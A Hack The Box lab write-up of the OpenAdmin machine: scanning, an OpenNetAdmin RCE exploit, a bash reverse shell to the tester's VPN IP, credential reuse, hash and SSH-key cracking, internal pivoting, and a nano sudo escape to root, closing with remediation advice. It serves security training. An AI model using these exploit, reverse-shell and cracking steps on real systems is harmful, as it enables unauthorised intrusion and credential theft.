+++
date = '2026-06-01T23:49:11-04:00'
title = 'Help'
tags = ["htb", "easy", "password attack","nano","internal pivot"]
+++

![](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/5b00db157dbbd7099ff6c0ef10f910ea.png)

https://www.hackthebox.com/machines/OpenAdmin
## OS: Linux
``` IP
10.129.14.206
```
## Credentials:

| Username  | Password        | Notes/Hash                                                           |
| --------- | --------------- | -------------------------------------------------------------------- |
| `ona_sys` | `n1nj4W4rri0R!` | database password                                                    |
| `jimmy`   | `n1nj4W4rri0R!` | got a hint from `0xdf` writeup to spray password                     |
| `jimmy`   | `Revealed`      | the internal service password on unusual port                        |
| `joanna`  | `bloodninjas`   | cracked from `ssh2john` hash on `rsa` key revealed from unusual port |

---
## `nmap` results:
```
# Nmap 7.99 scan initiated Wed Jun 10 18:15:45 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/OpenAdmin 10.129.14.206
Nmap scan report for 10.129.14.206
Host is up, received reset ttl 63 (0.017s latency).
Scanned at 2026-06-10 18:15:46 EDT for 20s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcVHOWV8MC41kgTdwiBIBmUrM8vGHUM2Q7+a0LCl9jfH3bIpmuWnzwev97wpc8pRHPuKfKm0c3iHGII+cKSsVgzVtJfQdQ0j/GyDcBQ9s1VGHiYIjbpX30eM2P2N5g2hy9ZWsF36WMoo5Fr+mPNycf6Mf0QOODMVqbmE3VVZE1VlX3pNW4ZkMIpDSUR89JhH+PHz/miZ1OhBdSoNWYJIuWyn8DWLCGBQ7THxxYOfN1bwhfYRCRTv46tiayuF2NNKWaDqDq/DXZxSYjwpSVelFV+vybL6nU0f28PzpQsmvPab4PtMUb0epaj4ZFcB1VVITVCdBsiu4SpZDdElxkuQJz
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
|   256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBcV0sVI0yWfjKsl7++B9FGfOVeWAIWZ4YGEMROPxxk4
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

 
---
## Attack + Enum Vectors
- TCP 80: HTTP Apache httpd 2.4.29
- TCP 22: SSH OpenSSH 7.6p1
### UDP (161 SNMP)?
- closed

---
## Service Enum Notes:
### Web Service: `Gobuster` / `fuff`
```
gobuster dir -u http://10.129.14.206 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 100 -r -exclude-length 0
```
```
music                (Status: 200) [Size: 12554]
artwork              (Status: 200) [Size: 14461]
sierra               (Status: 200) [Size: 43029]
server-status        (Status: 403) [Size: 278]
marga                (Status: 200) [Size: 18191]
```
viewing the sites, and:
```
http://10.129.14.206/music/
```
there's a `Login` on the top right, clicking on it redirected to:
```
http://10.129.14.206/ona/
```
and hovering over the `DOWNLOAD` button reveals on the bottom left
```
https://opennetadmin.com/download.html
```
and showed version `v18.1.1`

---
## Initial Foothold
searching google online:
```
open net admin exploit
```
we found an exploit on gitbhub, which is possible working exploit with version `8.5.14 <= 18.1.1` as vulnerable versions.
```
https://github.com/sec-it/OpenNetAdmin-RCE
```
cloning it and running:
```
ruby exploit.rb exploit http://10.129.14.206/ona/ id
```
we got output:
```
[+] Command output:

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
so we have an RCE, let's get a shell. Set up a listener first:
```
sudo nc -lvnp 1337
```
then
```
ruby exploit.rb exploit http://10.129.14.206/ona/ "bash -c 'bash -i >& /dev/tcp/HTB_VPN_IP/1337 0>&1'"
```

Stabilizing the shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
export TERM=xterm
```
`Ctrl + Z` to background our shell
```
stty raw -echo;fg
```
```
reset
```
then enter my terminal size:
```
stty rows 48 cols 210
```
And now we have a fully functioning shell!

---
## Priv Esc
```
cat /etc/passwd | grep -i "sh"
```
```
root:x:0:0:root:/root:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```
so `jimmy` and `joanna` are 2 valid users.

I transferred `pspy64` to target and let's view some interesting results:
```
2026/06/10 23:39:58 CMD: UID=0     PID=1      | /sbin/init auto automatic-ubiquity noprompt 
2026/06/10 23:40:31 CMD: UID=33    PID=15454  | php -l /opt/ona/www/local/config/database_settings.inc.php 
2026/06/10 23:40:31 CMD: UID=33    PID=15453  | sh -c php -l /opt/ona/www/local/config/database_settings.inc.php 
2026/06/10 23:40:31 CMD: UID=33    PID=15452  | /usr/sbin/apache2 -k start
```
so there is a database settings, let's look at it:
```
cat /opt/ona/www/local/config/database_settings.inc.php
```
```
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```
and looking at listening ports:
```
ss -nptlu
```
```
Netid                  State                    Recv-Q                   Send-Q                                      Local Address:Port                                       Peer Address:Port                   
udp                    UNCONN                   0                        0                                           127.0.0.53%lo:53                                              0.0.0.0:*                      
udp                    UNCONN                   0                        0                                                 0.0.0.0:68                                              0.0.0.0:*                      
tcp                    LISTEN                   0                        128                                         127.0.0.53%lo:53                                              0.0.0.0:*                      
tcp                    LISTEN                   0                        128                                               0.0.0.0:22                                              0.0.0.0:*                      
tcp                    LISTEN                   0                        80                                              127.0.0.1:3306                                            0.0.0.0:*                      
tcp                    LISTEN                   0                        128                                             127.0.0.1:52846                                           0.0.0.0:*                      
tcp                    LISTEN                   0                        128                                                     *:80                                                    *:*                      
tcp                    LISTEN                   0                        128                                                  [::]:22                                                 [::]:* 
```
We see listening internally ports on `3306` which is possibly `mysql`, and an interesting one at `52846` which we might need to pivot internally to enumearte if nothing later.

Let's first enumerate the `mysql` database with `ona_sys:n1nj4W4rri0R!`
```
mysql -u 'ona_sys' -h localhost -p'n1nj4W4rri0R!'
```
and we got in, show the databases:
```
show databases;
```
```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| ona_default        |
+--------------------+
2 rows in set (0.00 sec)
```
let's enumerate `ona_default`
```
use ona_default;
```
and enumerate the tables:
```
show tables;
```
```
+------------------------+
| Tables_in_ona_default  |
+------------------------+
| blocks                 |
| configuration_types    |
| configurations         |
| custom_attribute_types |
| custom_attributes      |
| dcm_module_list        |
| device_types           |
| devices                |
| dhcp_failover_groups   |
| dhcp_option_entries    |
| dhcp_options           |
| dhcp_pools             |
| dhcp_server_subnets    |
| dns                    |
| dns_server_domains     |
| dns_views              |
| domains                |
| group_assignments      |
| groups                 |
| host_roles             |
| hosts                  |
| interface_clusters     |
| interfaces             |
| locations              |
| manufacturers          |
| messages               |
| models                 |
| ona_logs               |
| permission_assignments |
| permissions            |
| roles                  |
| sequences              |
| sessions               |
| subnet_types           |
| subnets                |
| sys_config             |
| tags                   |
| users                  |
| vlan_campuses          |
| vlans                  |
+------------------------+
40 rows in set (0.00 sec)
```
let's look at `users` for now to see if there's passwords:
```
select * from users;
```
```
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2026-06-10 23:50:31 | 2026-06-10 23:50:31 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
+----+----------+----------------------------------+-------+---------------------+---------------------+
2 rows in set (0.00 sec)
```
let's copy the hashes to `hashes.txt`, and brute with `john`
```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
failed appearantly? What about:
```
hashcat hashes.txt /usr/share/wordlists/rockyou.txt
```
select the lowest number one from detected:
```
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```
and we got:
```
21232f297a57a5a743894a0e4a801fc3:admin
098f6bcd4621d373cade4e832627b4f6:test
```
Oh dear, I probably fell in a rabbit hole. But let's spray these passwords against `jimmy` and `joanna` anyway just in case, and spray their user names. However, nothing yields us interesting results to log in.

I then ran `linpeass` and got some interesting results, the port of `52846` is indeed an internally hosted server I believe. Then these information:
```
══╣ PHP exec extensions               
drwxr-xr-x 2 root root 4096 Nov 22  2019 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Nov 22  2019 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 32 Nov 22  2019 /etc/apache2/sites-enabled/internal.conf -> ../sites-available/internal.conf
Listen 127.0.0.1:52846                                                           
<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal
<IfModule mpm_itk_module>                     
AssignUserID joanna joanna  
</IfModule>
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

Let's try to pivot internally
```
chisel server -p 9999 --reverse
```
then transfer `chisel` on to target and:
```
./chisel client HTB_VPN_IP:9999 R:8088:127.0.0.1:52846
```
but my version of chisel couldn't launch on target, let me switch to `ligolo`: on `kali`
```
sudo ip tuntap add user root mode tun ligolo
```
```
sudo ip link set ligolo up
```
```
sudo ligolo-proxy -selfcert
```
on kali:
```
sudo ip route add 240.0.0.1 dev ligolo
```
Then transfer `ligolo agent` to target
```
./agent -connect HTB_VPN_IP:11601 -ignore-cert
```
then on `ligolo` interface:
```
session
```
```
1
```
```
start
```
then let's browse to:
```
http://240.0.0.1:52846/
```
appearantly we need password and username?

I got a little stuck here and took a glace at [0xdf write up](https://0xdf.gitlab.io/2020/05/02/htb-openadmin.html) and concluded i actually forgot to re-use the password `n1nj4W4rri0R!` on `jimmy`, and we got shell as `jimmy`

As `jimmy`, we can finally view `/var/www/internal`:
```
grep -ri "password"
```
and we found a hash:
```
index.php:              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
```
let's try to crack the hash:
```
hashcat -m 1700 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
```
got:
```
00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1:Revealed
```
and with pivoting on:
```
http://240.0.0.1:52846/
```
we logged in with `jimmy:Revealed`: found a `ssh` private `rsa` key and a hint to `Don't forget your "ninja" password`:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```
copy that to our `id_rsa` file and ensure correct perms:
```
chmod 400 id_rsa
```
then let's try `ssh` to `joanna` user:
```
ssh -i id_rsa joanna@10.129.14.206
```
and prompted to ask us:
```
Enter passphrase for key 'id_rsa':
```
I tried `Revealed`, `Ninja`, `n1nj4W4rri0R!` all didn't work, well let's `john` it:
```
ssh2john id_rsa > ssh_hash.txt
```
and
```
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
```
yields:
```
bloodninjas      (id_rsa)
```
perfect, let's try `ssh` again:
```
ssh -i id_rsa joanna@10.129.14.206
```
and we logged in as `joanna`!

```
sudo -l
```
we have:
```
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
then using the https://gtfobins.org/gtfobins/nano/ trick:
```
/bin/nano /opt/priv
```
presss `Ctrl + R` and then `Ctrl + X`: then enter:
```
reset; bash 1>&0 2>&0
```
and our bash got weird:
```
reset
```
again, now we are `root`!

Therefore, pwn'd.

---
## Conclusion & Remediation
In my personal opinion, I really liked this box as it challenges password attacks of people trying to solve the box. The enumerations weren't too complicated but the review on spraying passwords on every single user and service is still a very valid and important concepts.

To remediate from similiar attacks assembled in this lab: system administrators must update their outdated web services to the earliest, or at least try to implement access control and hide it from normal users if updating cannot be done immediately. In addition, users should not be using the same password they have on one service as their own user's log in password. Similarly, passwords should create as complicated and complex as possible to prevent attackers from easily gaining access by brute forcing hashes if they did gain access.